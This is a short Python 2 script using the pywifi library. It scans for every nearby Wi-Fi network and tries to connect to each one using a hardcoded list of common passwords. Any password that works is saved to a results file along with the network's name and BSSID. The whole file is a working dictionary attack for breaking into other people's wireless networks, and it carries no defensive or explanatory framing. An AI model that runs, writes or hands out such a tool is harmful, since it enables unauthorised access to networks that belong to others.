#!usr/bin/env python

from pywifi import *
import time
import sys



def scans(face,timeout):
    face.scan()
    time.sleep(timeout)
    return face.scan_results()


def test(i,face,x,key,stu,ts):
    showID = x.bssid if len(x.ssid)>len(x.bssid) else x.ssid
    for n,k in enumerate(key):
        x.key = k.strip().replace("\n","")
        face.remove_all_network_profiles()
        face.connect(face.add_network_profile(x))
        code = 10
        t1 = time.time()
        while code!=0 :
            time.sleep(0.1)
            code = face.status()
            now = time.time()-t1
            if now>ts:
                break
            stu.write("\r%-*s| %-*s| %s |%*.2fs| %-*s |  %-*s %*s"%(6,i,18,showID,code,5,now,7,x.signal,10,len(key)-n,10,k.replace("\n","")))
            stu.flush()
            if code == 4:
                face.disconnect()
                return "%-*s| %s | %*s |%*s\n"%(20,x.ssid,x.bssid,3,x.signal,15,k)
    return False



def main():
    scantimes = 20
    testtimes = 25
    output = sys.stdout
    files = "TestRes.txt"
#    keys = open(sys.argv[1],"r").readlines()
    keys = [
            "12345678",
            "123456789",
            "88888888",
            "1234567890",
            "00000000",
            "87654321",
            "66668888",
            "11223344",
            "147258369",
            "11111111",
            ]
    print "|KEYS %s"%(len(keys))
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    scanres = scans(iface,scantimes)
    nums = len(scanres)
    print "|SCAN GET %s"%(nums)
    print "%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s"%("-"*70,6,"WIFIID",18,"SSID OR BSSID",2,"N",4,"time",7,"signal",10,"KEYNUM",10,"KEY","="*70)
    for i,x in enumerate(scanres):
        res = test(nums-i,iface,x,keys,output,testtimes)
        if res:
            open(files,"a").write(res)





if __name__ == '__main__':
    main()


